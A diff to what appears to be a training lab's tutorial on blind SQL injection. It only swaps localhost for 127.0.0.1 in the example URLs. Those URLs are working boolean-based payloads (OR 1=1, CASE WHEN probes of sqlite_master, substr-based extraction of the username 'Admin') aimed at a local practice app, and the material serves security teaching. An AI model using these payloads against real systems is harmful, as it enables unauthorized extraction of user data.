@@ -44,7 +44,7 @@ The first step is to identify parameters which could be potentially used in an S
 ![](.gitbook/assets/sqli-blind-1.png)
 
 ```text
-http://localhost:5000/home/1
+http://127.0.0.1:5000/home/1
 ```
 
 ### Step2
@@ -54,7 +54,7 @@ Now let's see if we can create an error by injecting a single quote
 ![](.gitbook/assets/sqli-blind-2.png)
 
 ```text
-http://localhost:5000/home/1'
+http://127.0.0.1:5000/home/1'
 ```
 
 However, it's still not possile we can't see this as the application shows a 404 Error page.
@@ -68,7 +68,7 @@ First, we inject a logical operator which is true \(or 1=1\). This should result
 ![](.gitbook/assets/sqli-blind-3.png)
 
 ```text
-http://localhost:5000/home/1 OR 1=1
+http://127.0.0.1:5000/home/1 OR 1=1
 ```
 
 After that we inject a logical operator which is false \(and 1=2\). This should result in the application returning an error.
@@ -76,7 +76,7 @@ After that we inject a logical operator which is false \(and 1=2\). This should 
 ![](.gitbook/assets/sqli-blind-4.png)
 
 ```text
-http://localhost:5000/home/1 AND 1=2--
+http://127.0.0.1:5000/home/1 AND 1=2--
 ```
 
 By doing so we are sure the application has a SQL Injection vulnerability.
@@ -98,13 +98,13 @@ We need to determine which conditions are TRUE and FALSE for the application. By
 ![](.gitbook/assets/sqli-blind-6.png)
 
 ```text
-http://localhost:5000/home/1
+http://127.0.0.1:5000/home/1
 ```
 
 ![](.gitbook/assets/sqli-blind-5.png)
 
 ```text
-http://localhost:5000/home/4
+http://127.0.0.1:5000/home/4
 ```
 
 #### Step 2
@@ -114,7 +114,7 @@ Now, we need to inject a IF condition, returning 1 for the TRUE cases and 4 for 
 ![](.gitbook/assets/sqli-blind-7.png)
 
 ```text
-http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
+http://127.0.0.1:5000/home/(select case when 1=1 then 1 else 4 end)
 ```
 
 #### Step 3
@@ -126,7 +126,7 @@ Let's check if the table users exists.
 ![](.gitbook/assets/sqli-blind-9.png)
 
 ```text
-http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
+http://127.0.0.1:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
 ```
 
 Good news! As we didn't see an error, it means the table _users_ exists.
@@ -146,7 +146,7 @@ Let's try to extract a valid user. Instead of having a dictionary of possible us
 ![](.gitbook/assets/sqli-blind-11.png)
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
 ```
 
 The error indicates it's not the case. Let's try with the letter _A_. Remember, case matters.
@@ -154,7 +154,7 @@ The error indicates it's not the case. Let's try with the letter _A_. Remember, 
 ![](.gitbook/assets/sqli-blind-12.png)
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
 ```
 
 Yes, it matches!
@@ -162,19 +162,19 @@ Yes, it matches!
 As initial guess, _Admin_ could be a possible user. So, let's test this theory:
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
 ```
 
 ```text
-http://localhost:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
+http://127.0.0.1:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
 ```
 
 We made it! None of the requests above returned _404 Error_, so this indicates _Admin_ is a valid value.
